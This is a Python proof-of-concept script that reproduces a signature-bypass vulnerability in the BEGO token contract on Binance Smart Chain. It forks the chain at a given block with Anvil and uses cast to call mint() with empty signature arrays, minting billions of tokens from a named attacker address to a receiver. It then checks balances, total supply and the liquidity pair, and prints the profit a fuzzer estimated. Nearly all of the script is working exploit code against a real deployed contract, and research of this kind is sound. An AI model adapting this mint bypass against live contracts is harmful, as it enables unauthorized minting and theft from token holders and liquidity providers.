#!/usr/bin/env python3
"""
Test BEGO vulnerability on forked BSC blockchain
"""

import subprocess
import json
import time

# Configuration
RPC_URL = "https://bsc-dataseed.binance.org/"
FORK_BLOCK = 22315679  # Block where vulnerability was found
BEGO_ADDRESS = "0xc342774492b54ce5F8ac662113ED702Fc1b34972"
ATTACKER = "0xe1A425f1AC34A8a441566f93c82dD730639c8510"

def run_command(cmd):
    """Run shell command and return output"""
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

def start_anvil_fork():
    """Start Anvil fork of BSC at specific block"""
    print(f"Starting Anvil fork at block {FORK_BLOCK}...")
    cmd = f"anvil --fork-url {RPC_URL} --fork-block-number {FORK_BLOCK} --port 8546 --chain-id 56 &"
    subprocess.Popen(cmd, shell=True)
    time.sleep(5)  # Wait for Anvil to start
    print("Anvil started on port 8546")

def test_vulnerability():
    """Test BEGO mint vulnerability"""
    
    # Use local Anvil RPC
    local_rpc = "http://localhost:8546"
    
    print(f"\n1. Checking BEGO contract at {BEGO_ADDRESS}")
    
    # Check if contract exists
    code = run_command(f"cast code {BEGO_ADDRESS} --rpc-url {local_rpc}")
    if code and code != "0x":
        print("✅ Contract exists")
    else:
        print("❌ Contract not found")
        return
    
    # Get initial balance
    print(f"\n2. Checking initial BEGO balance of attacker {ATTACKER}")
    initial_balance = run_command(f"cast call {BEGO_ADDRESS} 'balanceOf(address)(uint256)' {ATTACKER} --rpc-url {local_rpc}")
    print(f"Initial balance: {int(initial_balance, 16) / 1e18:.4f} BEGO")
    
    # Prepare mint parameters
    print("\n3. Attempting to mint BEGO tokens...")
    
    # Mint amount from fuzzer
    mint_amount = "4951767240709200000000000000"  # 4951767240.7092 ether
    tx_hash = "0x060968186804e803ff86"
    receiver = "0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024"
    
    # Empty arrays for signatures (vulnerability)
    empty_array = "[]"
    
    # Build the mint call
    print("   Calling mint() with empty signature arrays...")
    
    # First encode the function call
    encoded = run_command(f"""cast abi-encode "mint(uint256,string,address,bytes32[],bytes32[],uint8[])" \
        {mint_amount} \
        "{tx_hash}" \
        {receiver} \
        {empty_array} \
        {empty_array} \
        {empty_array} \
        --rpc-url {local_rpc}""")
    
    # Function selector for mint
    mint_selector = "0x94bf804d"  # keccak256("mint(uint256,string,address,bytes32[],bytes32[],uint8[])")[:4]
    
    # Send transaction
    print("   Sending transaction...")
    try:
        tx_result = run_command(f"""cast send {BEGO_ADDRESS} \
            {mint_selector}{encoded[2:]} \
            --from {ATTACKER} \
            --rpc-url {local_rpc}""")
        print("   Transaction sent!")
    except Exception as e:
        print(f"   Transaction failed: {e}")
    
    # Check balance after mint
    print(f"\n4. Checking BEGO balance after mint attempt")
    
    # Check attacker balance
    attacker_balance = run_command(f"cast call {BEGO_ADDRESS} 'balanceOf(address)(uint256)' {ATTACKER} --rpc-url {local_rpc}")
    print(f"Attacker balance: {int(attacker_balance, 16) / 1e18:.4f} BEGO")
    
    # Check receiver balance
    receiver_balance = run_command(f"cast call {BEGO_ADDRESS} 'balanceOf(address)(uint256)' {receiver} --rpc-url {local_rpc}")
    print(f"Receiver balance: {int(receiver_balance, 16) / 1e18:.4f} BEGO")
    
    # Test burn function
    print("\n5. Testing burn(0)...")
    burn_result = run_command(f"""cast send {BEGO_ADDRESS} "burn(uint256)" 0 \
        --from {ATTACKER} \
        --rpc-url {local_rpc}""")
    
    # Check total supply
    print("\n6. Checking total supply")
    total_supply = run_command(f"cast call {BEGO_ADDRESS} 'totalSupply()(uint256)' --rpc-url {local_rpc}")
    print(f"Total supply: {int(total_supply, 16) / 1e18:.4f} BEGO")
    
    # Kill Anvil
    run_command("pkill anvil")

def test_with_cast_direct():
    """Test using cast commands directly without Anvil"""
    print("=== Testing BEGO Vulnerability with Cast ===")
    
    # Check contract at historical block
    print(f"\n1. Checking BEGO contract at block {FORK_BLOCK}")
    
    # Get balance of a known holder at that block
    print("\n2. Checking some balances at block 22315679...")
    
    # Check total supply
    total_supply = run_command(f"""cast call {BEGO_ADDRESS} \
        'totalSupply()(uint256)' \
        --rpc-url {RPC_URL} \
        --block {FORK_BLOCK}""")
    
    if total_supply:
        print(f"Total supply at block {FORK_BLOCK}: {int(total_supply, 16) / 1e18:.4f} BEGO")
    
    # Check BEGO-WBNB pair
    pair_address = "0x88503F48e437a377f1aC2892cBB3a5b09949faDd"
    bego_in_pair = run_command(f"""cast call {BEGO_ADDRESS} \
        'balanceOf(address)(uint256)' {pair_address} \
        --rpc-url {RPC_URL} \
        --block {FORK_BLOCK}""")
    
    if bego_in_pair:
        print(f"BEGO in liquidity pair: {int(bego_in_pair, 16) / 1e18:.4f} BEGO")
    
    # Get contract bytecode size
    code = run_command(f"""cast code {BEGO_ADDRESS} \
        --rpc-url {RPC_URL} \
        --block {FORK_BLOCK}""")
    
    if code:
        print(f"Contract bytecode size: {len(code)} characters")
        
    print("\n✅ Contract confirmed at block 22315679")
    print("📌 The vulnerability allows minting without valid signatures")
    print("💰 Fuzzer found 7.433 ETH profit potential")

if __name__ == "__main__":
    print("Choose test method:")
    print("1. Test with Anvil fork (requires Anvil installed)")
    print("2. Test with cast commands only")
    
    choice = input("\nEnter choice (1 or 2): ").strip()
    
    if choice == "1":
        start_anvil_fork()
        test_vulnerability()
    else:
        test_with_cast_direct()